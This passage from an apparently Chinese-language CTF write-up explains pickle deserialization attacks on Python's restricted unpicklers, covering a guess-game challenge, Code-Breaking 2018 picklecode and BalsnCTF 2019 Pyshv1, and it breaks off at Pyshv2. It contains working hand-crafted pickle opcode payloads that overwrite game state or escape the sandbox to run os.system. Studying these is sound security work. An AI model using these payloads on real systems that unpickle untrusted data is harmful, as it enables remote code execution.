class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>server 端将接收到的数据进行反序列，这里与常规的 <code>pickle.loads</code> 不同，采用的是 Python 提供的<a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals" target="_blank" rel="noopener">安全措施</a>。也就是说，导入的模块只能以 <code>guess_name</code> 开头，并且名称里不能含有 <code>__</code>。</p><p>最初的想法还是想执行命令，只是做题的话完全不需要这么折腾，先来看一下判赢规则。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Game.py</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> max_round, number_range</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count = <span class="number">0</span></span><br><span class="line">        self.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_game</span><span class="params">(self, ticket)</span>:</span></span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> self.curr_ticket == ticket:</span><br><span class="line">            self.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finished</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_win</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure><p>只要能控制住 <code>curr_ticket</code>，每局就能稳赢，或者直接将 <code>win_count</code> 设为 10，能实现吗？</p><p><strong>先试试覆盖 <code>win_count</code> 和 <code>round_count</code></strong>。换句话来说，就是需要在反序列化 Ticket 对象前执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game  <span class="comment"># __init__.py  game = Game()</span></span><br><span class="line">game.round_count = <span class="number">10</span></span><br><span class="line">game.win_count = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>pickle 里并不能直接用等号赋值，但有对应的指令用来改变属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BUILD = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"><span class="comment"># 具体实现在 pickle.py 的 1546 行</span></span><br></pre></td></tr></table></figure><p>开始构造</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game</span><br><span class="line">&#125;S'round_count'</span><br><span class="line">I10</span><br><span class="line">sS'win_count'</span><br><span class="line">I10</span><br><span class="line">sb</span><br></pre></td></tr></table></figure><p>其中，<code>}</code> 是往 stack 中压入一个空 dict，<code>s</code> 是将键值对插入到 dict。</p><p>测试一下效果，成功。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7yxg3sbn9j20pj062wew.jpg" alt="image.png"></p><p>到这就做完了吗？不，还有个小验证，<code>assert type(ticket) == Ticket</code>。</p><p>之前提到过，<code>pickle</code> 序列流执行完后将把栈顶的值返回，那结尾再留一个 <code>Ticket</code> 的对象就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ticket = Ticket(<span class="number">6</span>)</span><br><span class="line">res = pickle.dumps(ticket)  <span class="comment"># 这里不能再用 0 号协议，否则会出现 ccopy_reg\n_reconstructor</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>最终 payload：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S"win_count"<span class="symbol">\n</span>I10<span class="symbol">\n</span>sS"round_count"<span class="symbol">\n</span>I9<span class="symbol">\n</span>sbcguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sb.</span><br></pre></td></tr></table></figure><p><strong>尝试覆盖掉 <code>current_ticket</code></strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span></span><br><span class="line">game</span><br><span class="line">&#125;S'curr_ticket'</span><br><span class="line">cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sbp0</span><br><span class="line">sbg0</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。</p><p>最终 payload：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S'curr_ticket'<span class="symbol">\n</span>cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>07sbp0<span class="symbol">\n</span>sbg0<span class="symbol">\n</span>.</span><br></pre></td></tr></table></figure><h3 id="Code-Breaking-2018-picklecode"><a href="#Code-Breaking-2018-picklecode" class="headerlink" title="Code-Breaking 2018 picklecode"></a>Code-Breaking 2018 picklecode</h3><blockquote><p>完整源码： <a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">'PickleSerializer'</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, str):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">"Can't load pickle from unicode string"</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">'ASCII'</span>, errors=<span class="string">'strict'</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>这只是原题的一部分，重点关注下这个沙箱如何逃逸。先看个东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(globals()[<span class="string">'__builtins__'</span>], <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br><span class="line"></span><br><span class="line">&lt;=&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(dict.get(globals(), <span class="string">'__builtins__'</span>), <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p><code>getattr</code> 和 <code>globals</code> 并没有被禁，那就尝试写 pickle 吧。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">dict</span><br><span class="line">S'get'</span><br><span class="line">tRp100</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">globals</span><br><span class="line">(<span class="name">tRS</span>'__builtins__'</span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>g100</span><br><span class="line">(<span class="name">g101</span></span><br><span class="line">S'eval'</span><br><span class="line">tR(<span class="name">S</span>'__import__(<span class="string">"os"</span>).system(<span class="string">"dir"</span>)'</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>PS：我的环境是 Python 3.7.4，反序列化时获取到的 <code>builtins</code> 是一个 <code>dict</code>，所以用了两次 <code>get</code>，视环境进行调整吧。这个 payload 在 Python 3.7.3 又跑不起来 ：）</p><h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, io</span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'sys'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure><p>限制了导入的模块只能是 <code>sys</code>，问题是这个模块也不安全呀 ：）</p><blockquote><p><code>sys.modules</code></p><p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail.</p></blockquote><p>如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库是默认被加载进来的，例如 <code>os</code>，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。 </p><p>这里的 <code>find_class</code> 直接调的 pickle.py 中的方法，那就先看看它如何导入包的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pickle.Unpickler.find_class</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    <span class="keyword">if</span> self.proto &lt; <span class="number">3</span> <span class="keyword">and</span> self.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    __import__(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> self.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure><p>其中 <code>sys.modules</code> 为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    'sys': &lt; module 'sys'(built - in ) &gt; ,</span><br><span class="line">    'builtins': &lt; module 'builtins'(built - in ) &gt; ,</span><br><span class="line">    'os': &lt; module 'os'</span><br><span class="line">    from 'C:\\Users\\wywwzjj\\AppData\\Local\\Programs\\Python\\Python37\\lib\\os.py' &gt; ,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们的目标：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cos\nsystem  &lt;=&gt; getattr(sys.modules['os'], 'system')</span><br></pre></td></tr></table></figure><p>限制了 module 只能为 sys，那能否把 <code>sys.modules[&#39;sys&#39;]</code>替换为<code>sys.modules[&#39;os&#39;]</code>，从而引入危险模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line">modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> system</span><br></pre></td></tr></table></figure><p>本地实验一下，成功：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\wywwzjj&gt; python</span><br><span class="line">Python <span class="number">3.7</span>.<span class="number">4</span> (tags/v3.<span class="number">7.4</span>:e09359112e, Jul  <span class="number">8</span> <span class="number">2019</span>, <span class="number">20</span>:<span class="number">34</span>:<span class="number">20</span>) [MSC v.<span class="number">1916</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from sys import modules</span><br><span class="line">&gt;&gt;&gt; modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line">&gt;&gt;&gt; from sys import system</span><br><span class="line">&gt;&gt;&gt; system(<span class="string">'dir'</span>)</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F497-F727</span><br><span class="line"></span><br><span class="line"> C:\Users\wywwzjj 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2019</span>/<span class="number">08</span>/<span class="number">22</span>  <span class="number">21</span>:<span class="number">02</span>             <span class="number">2</span>,<span class="number">750</span> <span class="selector-class">.aggressor</span><span class="selector-class">.prop</span></span><br><span class="line"><span class="number">2019</span>/<span class="number">09</span>/<span class="number">16</span>  <span class="number">00</span>:<span class="number">09</span>    &lt;DIR&gt;          .anaconda</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">09</span>  <span class="number">13</span>:<span class="number">58</span>    &lt;DIR&gt;          .android</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">13</span>  <span class="number">14</span>:<span class="number">37</span>    &lt;DIR&gt;          .astropy</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>            <span class="number">18</span>,<span class="number">465</span> .bash_history</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">07</span>  <span class="number">12</span>:<span class="number">03</span>    &lt;DIR&gt;          <span class="selector-class">.CLion2019</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>还有个小麻烦，<code>modules</code> 是个 <code>dict</code>，无法直接取值。继续利用 <code>getattr(sys.modules[module], name)</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'sys'</span>] = sys.modules</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(sys)  <span class="comment"># 成功导入 dict 对象</span></span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'clear'</span>, <span class="string">'copy'</span>, <span class="string">'fromkeys'</span>, <span class="string">'get'</span>, <span class="string">'items'</span>, <span class="string">'keys'</span>, <span class="string">'pop'</span>, <span class="string">'popitem'</span>, <span class="string">'setdefault'</span>, <span class="string">'update'</span>, <span class="string">'values'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(sys, <span class="string">'get'</span>)  <span class="comment"># 结合 find_class 中的 getattr</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> method get of dict object at <span class="number">0x000002622D052688</span>&gt;</span><br></pre></td></tr></table></figure><p>改写成 pickle：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">S<span class="string">'sys'</span></span><br><span class="line">g100</span><br><span class="line">scsys</span><br><span class="line"><span class="built_in">get</span></span><br><span class="line">(S<span class="string">'os'</span></span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>S<span class="string">'sys'</span></span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line"><span class="keyword">system</span></span><br><span class="line">(S<span class="string">'dir'</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 